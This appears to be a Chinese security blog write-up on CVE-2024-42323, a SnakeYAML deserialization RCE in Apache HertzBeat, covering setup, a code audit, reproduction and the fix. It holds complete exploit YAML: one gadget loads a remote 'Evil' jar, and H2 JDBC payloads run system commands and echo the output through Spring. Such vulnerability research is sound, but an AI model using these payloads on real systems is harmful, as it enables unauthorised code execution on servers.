---
title: "Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）"
onlyTitle: true
date: 2025-4-17 17:11:08
categories:
- java
- 框架漏洞
tags:
- SnakYaml
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8147.jpg
---



# Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）

snakeYaml反序列化：https://godownio.github.io/2024/10/28/snakeyaml

commit来自https://github.com/apache/hertzbeat/commit/88a843612d0702bd82729526aa28d784874c37c9#diff-8e8715de7d4daf4470f78dbaf8eaf67ad803ddd7c74ccfadfe6b1d799ff8721bR96

commit内把ScriptEngineManager和URLClassLoader加入了黑名单

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415160213022.png)

还修改了snakeYaml的版本

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415160256814.png)

Apache HertzBeat 是开源的实时监控工具。受影响版本中由于使用漏洞版本的 SnakeYAML v1.32解析用户可控的 yaml  文件，经过身份验证的攻击者可通过 /api/monitors/import、/api/alert/defines/import  接口新增监控类型时配置恶意的 yaml 脚本远程执行任意代码。

## 环境搭建

奇安信攻防社区怎么复现这么好😡，漏洞搭建都写了

下载源码：https://github.com/apache/hertzbeat/archive/refs/tags/v1.4.4.zip

环境要求：

后端：maven3+, java17, lombok

前端：nodejs npm angular-cli

解压之后找到manager目录下的Manager启动后端代码：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415161910054.png)

启动前端：

在web-app目录下安装依赖`npm install`

>`npm install` 会自动读取和解析项目中的一些**关键配置文件**，如下
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415163313337.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415163721326.png)

全局安装angular：`npm install -g @angular/cli`

运行ng serve --open 启动前端页面，跳转到HertzBeat的登陆界面，默认密码admin/hertzbeat

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415165208175.png)

## 代码审计

审代码，还知道漏洞路由，当然是看到Controller了

锁定到/api/monitors/import路由，调用importConfig来处理传入的文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415171311968.png)

实际跟进到MonitorServiceImpl.importConfig内。该方法根据文件的不同类型调用设置不同的type，再从imExportServiceMap中取出对应的imExportService

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415171516221.png)

在MonitorServiceImpl构造函数对imExportServiceMap进行的初始化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415171828198.png)

构造函数参数是`List<ImExportService>`(警觉)

Spring 从 **Spring 4.3** 起，spring会在启动时扫描并注入`List<接口类型>`，只要满足以下两个条件，即使你没有显式加 `@Autowired` 注解。

📌 满足以下两个条件就自动注入：

1. **类上是 Spring Bean**（如 `@Component`、`@Service` 等注解）；
2. **构造函数只有一个**（没有重载）；

具体过程：

* 当 Spring 实例化 `MonitorServiceImpl` 时，会发现构造器的参数是一个 `List<ImExportService>`。

* 于是 Spring 就去容器里找：有哪些 Bean 是实现了 `ImExportService` 接口的？找到了 `xxxExportService` 和 `xxxExportService`，于是组成一个列表传给构造函数。

Spring 不止支持注入 `List<接口>`，还支持：

- `Map<String, Xxx>`：会注入 bean name -> bean 实例的映射；
- `Set<Xxx>`：注入不重复的 bean 实现；
- `ObjectProvider<Xxx>`：更懒加载更灵活的依赖注入；
- `@Qualifier`：指定具体某个实现注入。

当然多个构造函数，就需要用@Autowired显式地告诉spring用哪个构造器进行注入

回到`List<ImExportService>`，继承了ImExportService接口的有以下四个类：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415174833921.png)

所以用YamllmExportServiceImpl来处理yaml文件，该类没有importConfig方法，转交给他的父类AbstarctImExportServiceImpl处理。

AbstarctImExportServiceImpl.importConfig调用了parseImport

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415175142817.png)

跟进到YamllmExportServiceImpl.parseImport，snakeYaml反序列化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415175252804.png)

## 漏洞复现

登录到HertzBeat后台，可以选择左边任意一个监控，选择导入监控

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415175623107.png)

没有模板的话，随便新建一个监控然后导出

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415180146912.png)

随便修改一个字段的值为snakeYaml反序列化的payload就能触发漏洞

```yaml
- !!org.dromara.hertzbeat.manager.service.impl.AbstractImExportServiceImpl$ExportMonitorDTO
  detected: false
  metrics:
  - basic
  - cache
  - performance
  - innodb
  - status
  - handler
  - connection
  - thread
  - tmp
  - select_type
  - sort
  - table_lock
  - process_state
  - slow_sql
  monitor:
    app: mysql
    collector: null
    description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8888/EvilServiceScriptEngineFactory_jdk8.jar"]]]]
    host: Evil
    intervals: 60
    name: MYSQL_Evil
    status: 1
    tags:
    - 1
    - 2
  params:
  - field: host
    type: 1
    value: Evil
  - field: port
    type: 0
    value: '3306'
  - field: database
    type: 1
    value: Evil
  - field: username
    type: 1
    value: admin
  - field: password
    type: 2
    value: 1VoUqkaf3xVudnLjC1gtzw==
  - field: timeout
    type: 0
    value: '6000'
  - field: url
    type: 1
    value: null

```



## Spring下的SnakeYaml反序列化

Apache Hertzbeat是基于Spring开发的应用，其用到了h2database，可以利用org.h2.jdbcx.JdbcDataSource打h2 JDBC Attack

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417163423838.png)

https://godownio.github.io/2024/10/28/snakeyaml/#%E4%B8%8D%E5%87%BA%E7%BD%91H2-JDBC

```java
!!org.h2.jdbc.JdbcConnection
- jdbc:h2:mem:test
- MODE: MSSQLServer
  INIT: |
    drop alias if exists exec;
    CREATE ALIAS EXEC AS $$void exec() throws Exception {Runtime.getRuntime().exec("calc.exe");}$$;
    CALL EXEC ();
- a
- b
- false
```

利用JDBC Attack能直接任意代码执行，spring环境下直接打spring回显就行

```yaml
!!org.h2.jdbc.JdbcConnection
- jdbc:h2:mem:test
- MODE: MSSQLServer
  INIT: |
    DROP ALIAS IF EXISTS EXEC;
    CREATE ALIAS EXEC AS $$void exec() throws Exception {org.springframework.util.StreamUtils.copy(java.lang.Runtime.getRuntime().exec("id").getInputStream(),((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes()).getResponse().getOutputStream());}$$;
    CALL EXEC ();
- a
- b
- false
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417170824468.png)

```yaml
- !!org.dromara.hertzbeat.manager.service.impl.AbstractImExportServiceImpl$ExportMonitorDTO
  detected: false
  metrics:
  - basic
  - cache
  - performance
  - innodb
  - status
  - handler
  - connection
  - thread
  - tmp
  - select_type
  - sort
  - table_lock
  - process_state
  - slow_sql
  monitor:
    app: mysql
    collector: null
    description: !!org.h2.jdbc.JdbcConnection
      - jdbc:h2:mem:test
      - MODE: MSSQLServer
        INIT: |
          DROP ALIAS IF EXISTS EXEC;
          CREATE ALIAS EXEC AS $$void exec() throws Exception {
            org.springframework.util.StreamUtils.copy(
              java.lang.Runtime.getRuntime().exec("ipconfig").getInputStream(),
              ((org.springframework.web.context.request.ServletRequestAttributes)
                org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes()
              ).getResponse().getOutputStream()
            );
          }$$;
          CALL EXEC ();
      - a
      - b
      - false
    host: any
    intervals: 60
    name: MYSQL_any
    status: 1
    tags:
    - 3
    - 4
  params:
  - field: host
    type: 1
    value: any
  - field: port
    type: 0
    value: '3306'
  - field: database
    type: 1
    value: any
  - field: username
    type: 1
    value: admin
  - field: password
    type: 2
    value: 1VoUqkaf3xVudnLjC1gtzw==
  - field: timeout
    type: 0
    value: '6000'
  - field: url
    type: 1
    value: null

```

回过头来看在v1.4.1 commit内修改的黑名单禁用ScriptEngineManager和URLClassLoader和SnakeYaml版本号毫无卵用

在v1.6.0版本中，Hertzbeat最终通过增加`SafeConstructor`修复了这个问题：https://github.com/apache/hertzbeat/pull/1611。

或者更新SnakeYaml>=2.0也可以





REF：

https://forum.butian.net/article/612

https://github.com/vulhub/vulhub/blob/master/hertzbeat/CVE-2024-42323/README.zh-cn.md

https://github.com/apache/hertzbeat/commit/88a843612d0702bd82729526aa28d784874c37c9#diff-8e8715de7d4daf4470f78dbaf8eaf67ad803ddd7c74ccfadfe6b1d799ff8721bR96

https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html